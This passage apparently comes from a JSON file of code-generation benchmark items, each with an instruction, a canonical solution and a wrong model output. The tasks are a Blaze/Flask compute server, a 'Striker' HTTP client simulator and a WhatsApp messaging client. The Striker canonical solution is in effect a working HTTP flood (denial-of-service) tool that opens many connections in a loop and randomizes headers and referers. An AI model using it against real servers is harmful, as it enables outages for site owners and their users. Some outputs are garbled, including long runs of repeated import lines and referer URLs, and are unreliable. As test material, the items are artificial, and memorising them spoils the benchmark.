werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware\nfrom werkzeug.middleware.shared_data import SharedDataMiddleware\nfrom werkzeug.middleware.dispatcher import DispatcherMiddleware"
  },
  {
    "Task_id": 179,
    "Instruction": "Task Description: Create a Flask-based HTTP server that handles computation requests, supports CORS, and provides flexible serialization formats with proper error handling and logging capabilities.\n\nClass Description: The Server class encapsulates a Flask application with enhanced exception formatting and provides methods to run the server and handle computation requests through a dedicated API blueprint.\n\nAttributes:\n- app: [FlaskWithExceptionFormatting] - The Flask application instance with custom exception formatting\n- data: [dict] - Data store for the server (optional)\n- port: [int] - The port number the server is running on\n\nMethods:\n- __init__: [Name](data=None, formats=None, authorization=None, allow_profiler=False, profiler_output=None, profile_by_default=False, allow_add=False, logfile=sys.stdout, loglevel='WARNING', log_exception_formatter=None) -> [None] - Initializes the server with configuration options including data storage, serialization formats, authorization, profiling, and logging settings\n- run: [Name](port=6363, retry=False, **kwargs) -> [None] - Starts the Flask server on the specified port with optional retry logic if the port is busy\n\nAdditional Blueprint (api) Methods:\n- compserver: [Name]() -> [Response] - Handles POST, HEAD, and OPTIONS requests for computation, processes incoming data with supported serialization formats, and returns computation results (decorated with CORS support)",
    "Canonical_solution": "from flask import Flask, Blueprint, Response\nfrom flask_cors import cross_origin\nfrom werkzeug.http import parse_options_header\nimport collections\nimport sys\nimport logging\nfrom logging import Formatter\nfrom functools import wraps\nimport traceback\nfrom datetime import datetime\nimport os\nimport socket\nfrom time import time\nfrom warnings import warn\nimport importlib\nfrom blaze import compute, resource\nfrom blaze.compatibility import ExitStack\nfrom .serialization import json, all_formats\nfrom ..expr import Symbol, symbol\n\nclass FlaskWithExceptionFormatting(Flask):\n    def __init__(self, *args, **kwargs):\n        self.log_exception_formatter = kwargs.pop('log_exception_formatter', \n                                                 lambda tb: ''.join(traceback.format_tb(tb)))\n        super(FlaskWithExceptionFormatting, self).__init__(*args, **kwargs)\n\nclass Server:\n    def __init__(self, data=None, formats=None, authorization=None, allow_profiler=False,\n                 profiler_output=None, profile_by_default=False, allow_add=False,\n                 logfile=sys.stdout, loglevel='WARNING', log_exception_formatter=None):\n        app = self.app = FlaskWithExceptionFormatting('blaze.server.server',\n                                                     log_exception_formatter=log_exception_formatter)\n        app.register_blueprint(api,\n                              data=data if data is not None else {},\n                              formats=formats if formats is not None else (json,),\n                              authorization=authorization,\n                              allow_profiler=allow_profiler,\n                              profiler_output=profiler_output,\n                              profile_by_default=profile_by_default,\n                              allow_add=allow_add)\n        self.data = data\n        if logfile:\n            handler = logging.FileHandler(logfile) if isinstance(logfile, (str, bytes)) else logging.StreamHandler(logfile)\n            handler.setFormatter(Formatter('[%(asctime)s %(levelname)s] %(message)s [in %(pathname)s:%(lineno)d]'))\n            handler.setLevel(getattr(logging, loglevel))\n            app.logger.addHandler(handler)\n\n    def run(self, port=6363, retry=False, **kwargs):\n        self.port = port\n        try:\n            self.app.run(port=port, **kwargs)\n        except socket.error:\n            if not retry:\n                raise\n            warn(\"Oops, couldn't connect on port %d.  Is it busy?\" % port)\n            self.run(port=port + 1, retry=retry, **kwargs)\n\napi = Blueprint('api', __name__)\n\n@api.route('/compute', methods=['POST', 'HEAD', 'OPTIONS'])\n@cross_origin(origins='*', methods=['POST', 'HEAD', 'OPTIONS'])\ndef compserver():\n    raw_content_type = flask.request.headers['content-type']\n    content_type, options = parse_options_header(raw_content_type)\n    \n    if content_type not in accepted_mimetypes:\n        return ('Unsupported serialization format %s' % content_type, 415)\n\n    try:\n        serial = _get_format(accepted_mimetypes[content_type])\n    except KeyError:\n        return (\"Unsupported serialization format '%s'\" % content_type, 415)\n\n    try:\n        payload = serial.loads(flask.request.data)\n    except ValueError:\n        return (\"Bad data.  Got %s \" % flask.request.data, 400)\n\n    # Main computation logic here\n    # ... (rest of computation handling code)\n\n    return serial.dumps(response)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask, request, jsonify, Blueprint, Response\nfrom flask_cors import CORS\nimport sys\nimport traceback\n\nclass Server:\n    def __init__(self, data=None, formats=None, authorization=None, allow_profiler=False, profiler_output=None, profile_by_default=False, allow_add=False, logfile=sys.stdout, loglevel='WARNING', log_exception_formatter=None):\n        self.app = FlaskWithExceptionFormatting(logfile=logfile, loglevel=loglevel, log_exception_formatter=log_exception_formatter)\n        self.data = data\n        self.port = 6363\n        self.api = Blueprint('api', __name__)\n        self.api.add_url_rule('/compserver', 'compserver', self.compserver, methods=['POST', 'HEAD', 'OPTIONS'])\n        self.app.register_blueprint(self.api)\n        CORS(self.app)\n        self.formats = formats\n        self.authorization = authorization\n        self.allow_profiler = allow_profiler\n        self.profiler_output = profiler_output\n        self.profile_by_default = profile_by_default\n        self.allow_add = allow_add\n\n    def run(self, port=6363, retry=False, **kwargs):\n        self.port = port\n        self.app.run(port=self.port, **kwargs)\n\n    def compserver(self):\n        if request.method == 'OPTIONS':\n            return Response(status=200)\n        if self.authorization:\n            auth = request.headers.get('Authorization')\n            if not auth or not self.authorization(auth):\n                return Response(status=401)\n        if request.method == 'HEAD':\n            return Response(status=200)\n        if not self.formats:\n            return Response(status=400)\n        if request.method == 'POST':\n            try:\n                data = self.formats.deserialize(request.data)\n            except Exception as e:\n                return Response(status=400, response=str(e))\n            if self.allow_add:\n                self.data.append(data)\n            if self.allow_profiler:\n                if request.args.get('profile') or self.profile_by_default:\n                    profiler = Profiler(self.profiler_output)\n                    profiler.start()\n                    result = self.data.compute(data)\n                    profiler.stop()\n                    return Response(status=200, response=self.formats.serialize(result))\n            result = self.data.compute(data)\n            return Response(status=200, response=self.formats.serialize(result))\n        return Response(status=405)\n\nclass FlaskWithExceptionFormatting(Flask):\n    def __init__(self, logfile=sys.stdout, loglevel='WARNING', log_exception_formatter=None):\n        super().__init__()\n        self.logfile = logfile\n        self.loglevel = loglevel\n        self.log_exception_formatter = log_exception_formatter\n\n    def log_exception(self, exc_info):\n        if self.log_exception_formatter:\n            formatted_exception = self.log_exception_formatter(*exc_info)\n        else:\n            formatted_exception = ''.join(traceback.format_exception(*exc_info))\n        self.logger.error(formatted_exception)\n```\n"
  },
  {
    "Task_id": 19,
    "Instruction": "Task Description: Create a Python class that simulates multiple HTTP clients making concurrent requests to a target server, tracking successful and failed requests, with support for both HTTP and HTTPS protocols.\n\nClass Description: Striker is a Process subclass designed to simulate multiple concurrent HTTP clients. It creates and manages multiple socket connections to a target server, sends randomized HTTP requests, tracks request counts, and handles connection cleanup.\n\nAttributes:\n- counter: [list] - Shared counter for tracking successful and failed requests (index 0 for success, 1 for failures)\n- nr_socks: [int] - Number of concurrent socket connections to maintain\n- runnable: [bool] - Control flag for the main execution loop\n- socks: [list] - List of active socket connections\n- ssl: [bool] - Flag indicating whether to use HTTPS\n- host: [str] - Target server hostname\n- url: [str] - Base URL path for requests\n- port: [int] - Target server port number\n- referers: [list] - List of referer URLs for request randomization\n\nMethods:\n- __init__(url, nr_sockets, counter) -> [None] - Initializes the Striker with target URL, connection count, and shared counter\n- run() -> [None] - Main execution loop that creates connections, sends requests, and processes responses\n- closeConnections() -> [None] - Closes all active socket connections\n- createPayload() -> [tuple] - Generates randomized request payload (URL and headers)\n- generateData() -> [tuple] - Creates request URL with random query string and headers\n- stop() -> [None] - Stops the execution loop and cleans up resources\n- incCounter() -> [None] - Increments the success counter\n- incFailed() -> [None] - Increments the failure counter",
    "Canonical_solution": "from multiprocessing import Process, Manager\nimport urlparse\nimport random\nimport sys\n\nif sys.version_info < (3,0):\n    import httplib\n    HTTPCLIENT = httplib\nelse:\n    import http.client\n    HTTPCLIENT = http.client\n\nclass Striker(Process):\n    def __init__(self, url, nr_sockets, counter):\n        super(Striker, self).__init__()\n        self.counter = counter\n        self.nr_socks = nr_sockets\n        self.runnable = True\n        self.socks = []\n        \n        parsedUrl = urlparse.urlparse(url)\n        self.ssl = parsedUrl.scheme == 'https'\n        self.host = parsedUrl.netloc.split(':')[0]\n        self.url = parsedUrl.path\n        self.port = parsedUrl.port or (443 if self.ssl else 80)\n        self.referers = [\n            'http://www.google.com/',\n            'http://www.bing.com/',\n            'http://' + self.host + '/'\n        ]\n\n    def run(self):\n        while self.runnable:\n            try:\n                for i in range(self.nr_socks):\n                    if self.ssl:\n                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port)\n                    else:\n                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)\n                    self.socks.append(c)\n\n                for conn_req in self.socks:\n                    (url, headers) = self.createPayload()\n                    conn_req.request('GET', url, None, headers)\n\n                for conn_resp in self.socks:\n                    resp = conn_resp.getresponse()\n                    self.incCounter()\n\n                self.closeConnections()\n            except:\n                self.incFailed()\n\n    def closeConnections(self):\n        for conn in self.socks:\n            try:\n                conn.close()\n            except:\n                pass\n\n    def createPayload(self):\n        req_url, headers = self.generateData()\n        random_keys = headers.keys()\n        random.shuffle(random_keys)\n        random_headers = {}\n        for header_name in random_keys:\n            random_headers[header_name] = headers[header_name]\n        return (req_url, random_headers)\n\n    def generateData(self):\n        param_joiner = \"&\" if self.url.count(\"?\") > 0 else \"?\"\n        request_url = self.url + param_joiner + self.generateQueryString(random.randint(1,5))\n        http_headers = self.generateRandomHeaders()\n        return (request_url, http_headers)\n\n    def stop(self):\n        self.runnable = False\n        self.closeConnections()\n        self.terminate()\n\n    def incCounter(self):\n        try:\n            self.counter[0] += 1\n        except:\n            pass\n\n    def incFailed(self):\n        try:\n            self.counter[1] += 1\n        except:\n            pass",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport random\nimport socket\nimport ssl\nimport time\nfrom multiprocessing import Process\n\nclass Striker(Process):\n    def __init__(self, url, nr_sockets, counter):\n        Process.__init__(self)\n        self.counter = counter\n        self.nr_socks = nr_sockets\n        self.runnable = True\n        self.socks = []\n        self.ssl = False\n        self.host = url.split('/')[2]\n        self.url = url\n        self.port = 80\n        self.referers = [\n            'http://www.google.com/',\n            'http://www.usatoday.com/',\n            'http://www.yahoo.com/',\n            'http://www.cnn.com/',\n            'http://www.ebay.com/',\n            'http://www.wikipedia.org/',\n            'http://www.bing.com/',\n            'http://www.ask.com/',\n            'http://www.ign.com/',\n            'http://www.gamespot.com/',\n            'http://www.metacritic.com/',\n            'http://www.imdb.com/',\n            'http://www.cnet.com/',\n            'http://www.techcrunch.com/',\n            'http://www.apple.com/',\n            'http://www.microsoft.com/',\n            'http://www.android.com/',\n            'http://www.amazon.com/',\n            'http://www.reddit.com/',\n            'http://www.stackoverflow.com/',\n            'http://www.github.com/',\n            'http://www.hackerrank.com/',\n            'http://www.codechef.com/',\n            'http://www.codeforces.com/',\n            'http://www.topcoder.com/',\n            'http://www.acm.org/',\n            'http://www.ieee.org/',\n            'http://www.nature.com/',\n            'http://www.science.org/',\n            'http://www.plos.org/',\n            'http://www.sciencedirect.com/',\n            'http://www.springer.com/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n            'http://www.jstor.org/',\n"
  },
  {
    "Task_id": 190,
    "Instruction": "Task Description: Create a WhatsApp client class that interacts with the WhatsApp Business API to send text messages to users.\n\nClass Description: The WhatsAppClient class encapsulates functionality for sending text messages through the WhatsApp Business API. It handles authentication, API endpoint construction, and message payload preparation.\n\nAttributes:\nAPI_URL: str - Base URL for the WhatsApp Business API (default: \"https://graph.facebook.com/v17.0/\")\nWHATSAPP_API_TOKEN: str - Temporary access token for authenticating with the WhatsApp API\nWHATSAPP_CLOUD_NUMBER_ID: str - Phone number ID associated with the WhatsApp Business account\nheaders: dict - HTTP headers containing authorization and content type information\n\nMethods:\n__init__: () -> None - Initializes the WhatsAppClient instance by setting up authorization headers and constructing the base API URL\nsend_text_message: (message: str, phone_number: str) -> int - Sends a text message to the specified phone number via WhatsApp API and returns the HTTP status code",
